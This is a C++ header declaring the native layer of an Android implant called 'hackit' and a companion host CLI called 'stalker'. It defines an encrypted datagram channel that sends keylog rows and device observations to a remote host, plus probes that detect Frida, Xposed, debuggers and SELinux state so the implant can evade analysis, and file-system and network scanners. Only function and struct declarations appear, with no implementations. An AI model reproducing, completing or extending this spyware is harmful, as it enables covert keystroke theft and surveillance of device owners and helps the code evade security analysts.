// hackit native channel — shared declarations.
//
// Two builds share this header:
//   * libhackit.so  — JNI, loaded by the implant on Android
//   * stalker       — host CLI that runs the same probes without a JVM
//
// The channel is deliberately dumb: sealed datagrams into a queue, one worker
// draining it. Anything larger than a datagram stays in Java; native carries
// the high-rate, low-latency events (keylog rows, probe diffs, net changes).
#ifndef HACKIT_H
#define HACKIT_H

#include <cstddef>
#include <cstdint>
#include <string>
#include <vector>

namespace hackit {

constexpr size_t kKeyLen = 32;
constexpr size_t kNonceLen = 12;
constexpr size_t kTagLen = 16;
constexpr size_t kMaxFrame = 1400;
constexpr size_t kQueueCap = 512;

// ---- AEAD (RFC 8439) -------------------------------------------------------
void chacha20_block(uint32_t out[16], const uint8_t key[32], uint32_t counter, const uint8_t nonce[12]);
void chacha20_xor(uint8_t *data, size_t len, const uint8_t key[32], uint32_t counter, const uint8_t nonce[12]);
void poly1305(const uint8_t *msg, size_t len, const uint8_t key[32], uint8_t tag[16]);

// Seals plaintext into out (len + 16). Returns total bytes or 0 on overflow.
size_t aead_seal(uint8_t *out, size_t cap, const uint8_t key[32], const uint8_t *nonce,
                 const uint8_t *aad, size_t aad_len, const uint8_t *plain, size_t len);

// Opens ciphertext (len includes tag). Returns plaintext length or -1.
long aead_open(uint8_t *out, size_t cap, const uint8_t key[32], const uint8_t *nonce,
               const uint8_t *aad, size_t aad_len, const uint8_t *cipher, size_t len);

// ---- framing ---------------------------------------------------------------
struct Frame {
    uint8_t type;
    uint16_t seq;
    uint16_t len;
    uint8_t nonce[kNonceLen];
    uint8_t body[kMaxFrame];
};

// ---- transport -------------------------------------------------------------
struct Session {
    std::string host;      // numeric IPv4 or hostname
    uint16_t port;
    std::string sid;
    uint8_t key[kKeyLen];
    int fd;
    uint16_t seq;
    uint64_t sent;
    uint64_t dropped;
    uint64_t failed;
    int backoff_ms;
    uint64_t last_ok_ms;
};

// queue worker (transport.cpp)
void native_start(Session &s);
void native_stop();
int native_enqueue(const std::string &json, uint8_t type);

bool session_init(Session &s, const std::string &host, uint16_t port, const std::vector<uint8_t> &psk,
                  const std::string &sid);
void session_close(Session &s);
bool session_send_json(Session &s, const std::string &json, uint8_t type);
std::string session_state(const Session &s);

// ---- probes ----------------------------------------------------------------
std::string probe_maps();        // frida / xposed / injection markers
std::string probe_status();      // TracerPid, debug flag, selinux, pid
std::string probe_proc_list();   // /proc scan
std::string probe_net();         // /proc/net/tcp + udp listeners
std::string probe_mounts();      // mounts + suspicious paths
std::string probe_cpu();
std::string probe_snapshot();    // everything above, one JSON

// inotify watcher: one directory, callback-free — caller polls drain_watch()
bool watch_start(const std::string &directory);
bool watch_add(const std::string &directory);
std::string watch_drain();       // JSON array of new paths since last drain
void watch_stop();

std::string hex(const uint8_t *data, size_t len);
std::string json_escape(const std::string &text);

}  // namespace hackit

#endif  // HACKIT_H
